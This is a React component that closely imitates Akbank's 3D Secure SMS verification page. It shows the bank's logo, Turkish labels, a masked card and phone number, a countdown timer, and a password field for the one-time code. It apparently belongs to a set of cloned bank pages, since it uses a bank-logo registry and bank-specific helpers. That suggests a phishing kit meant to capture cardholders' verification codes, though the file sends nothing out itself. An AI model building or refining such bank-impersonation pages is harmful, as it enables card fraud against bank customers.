'use client';

import CardSchemeBadge from '@/components/CardSchemeBadge';
import BankLogo from '@/components/banks/logos/BankLogo';
import ThreeDSecureShell from './ThreeDSecureShell';
import {
  formatAmount,
  formatDateAkbank,
  maskCardAkbank,
  maskPhoneAkbank,
} from './threeDSecureUtils';
import { useCountdownTimer } from './useCountdownTimer';
import type { BankThreeDSecureProps } from './types';

function PhoneSmsIcon() {
  return (
    <svg width="48" height="56" viewBox="0 0 48 56" fill="none" aria-hidden>
      <rect x="12" y="4" width="24" height="40" rx="3" stroke="#333" strokeWidth="2" fill="#fff" />
      <circle cx="24" cy="38" r="2" fill="#333" />
      <path
        d="M30 8c4 0 8 3 8 8v2"
        stroke="#7c3aed"
        strokeWidth="2"
        strokeLinecap="round"
        fill="none"
      />
      <ellipse cx="36" cy="10" rx="5" ry="4" fill="#7c3aed" opacity="0.85" />
    </svg>
  );
}

export default function AkbankThreeDSecurePage({
  amount,
  cardNumber,
  phoneNumber,
  verificationCode,
  onVerificationCodeChange,
  error,
  loading,
  transactionDate,
  merchantName = 'A101',
  onSubmit,
  onCancel,
}: BankThreeDSecureProps) {
  const formattedAmount = formatAmount(amount);
  const { secondsLeft } = useCountdownTimer(180);
  const canSubmit = verificationCode.length >= 4 && !loading;

  const rows = [
    { label: 'İşyeri Adı', value: merchantName.toUpperCase() },
    { label: 'Tutar', value: `${formattedAmount} TL` },
    { label: 'Tarih', value: formatDateAkbank(transactionDate) },
    { label: 'Kart Numarası', value: maskCardAkbank(cardNumber), mono: true },
    { label: 'Cep Telefonu', value: maskPhoneAkbank(phoneNumber), mono: true },
  ];

  return (
    <ThreeDSecureShell onClose={onCancel}>
      <div className="px-4 pb-5 pt-4">
        <div className="relative overflow-hidden rounded-sm border border-gray-300 bg-white">
          <button
            type="button"
            onClick={onCancel}
            className="absolute right-3 top-3 z-10 text-xl leading-none text-gray-500 hover:text-gray-800"
            aria-label="Kapat"
          >
            ×
          </button>

          <div className="flex items-center justify-between gap-4 border-b border-gray-200 bg-white px-4 py-3 pr-10">
            <BankLogo bankId="akbank" height={42} />
            <CardSchemeBadge cardNumber={cardNumber} variant="akbank" />
          </div>

          <div className="px-4 pt-3">
            <p className="mb-3 border-b border-gray-200 pb-3 text-center text-[11px] font-semibold leading-snug text-gray-800">
              Uluslararası Güvenlik Platformu 3D Secure
            </p>

            <div className="mb-3 overflow-hidden rounded-sm border border-gray-200">
              {rows.map((row) => (
                <div
                  key={row.label}
                  className="grid grid-cols-[minmax(0,1fr)_auto] items-center gap-4 border-b border-gray-100 px-3 py-2.5 text-[12px] last:border-b-0"
                >
                  <span className="text-gray-600">{row.label}</span>
                  <span
                    className={`text-right font-semibold text-gray-900 ${row.mono ? 'font-mono tracking-wide' : ''}`}
                  >
                    {row.value}
                  </span>
                </div>
              ))}
            </div>

            <div className="mb-3 flex justify-center">
              <PhoneSmsIcon />
            </div>

            <p className="mb-4 text-center text-[12px] font-bold leading-relaxed text-gray-900">
              01 nolu 3D Secure / Go Güvenli Öde şifrenizi şifre alanına giriniz.
            </p>

            {error && (
              <div className="mb-3 rounded border border-red-200 bg-red-50 px-3 py-2 text-center text-xs text-red-600">
                {error}
              </div>
            )}

            <form onSubmit={onSubmit}>
              <div className="mb-2 grid grid-cols-[auto_1fr_auto] items-center gap-2">
                <label className="text-[13px] font-semibold text-gray-900">Şifre:</label>
                <input
                  type="password"
                  inputMode="numeric"
                  autoComplete="one-time-code"
                  value={verificationCode}
                  onChange={(e) => onVerificationCodeChange(e.target.value.replace(/\D/g, '').slice(0, 6))}
                  maxLength={6}
                  className="w-full rounded border border-gray-300 px-2 py-1.5 text-sm outline-none focus:border-[#e30613]"
                />
                <button type="button" className="text-[13px] text-[#e30613] underline">
                  Yardım
                </button>
              </div>

              <p className="mb-3 text-center text-[13px] text-[#e30613]">
                Onaylama süresinin dolmasına {secondsLeft} saniye kalmıştır
              </p>

              <label className="mb-4 flex items-start gap-2 text-[11px] leading-relaxed text-gray-800">
                <input type="checkbox" className="mt-0.5" />
                <span>Juzdan&apos;ı indir, mobil onaylarını tek tıkla ver.</span>
              </label>

              <button
                type="submit"
                disabled={!canSubmit}
                className={`w-full rounded-full py-3 text-sm font-bold text-white transition-colors duration-200 ${
                  canSubmit ? 'bg-[#e30613]' : 'bg-[#f4a8a8]'
                }`}
              >
                {loading ? 'Gönderiliyor...' : 'Devam'}
              </button>
            </form>
          </div>
        </div>
      </div>
    </ThreeDSecureShell>
  );
}
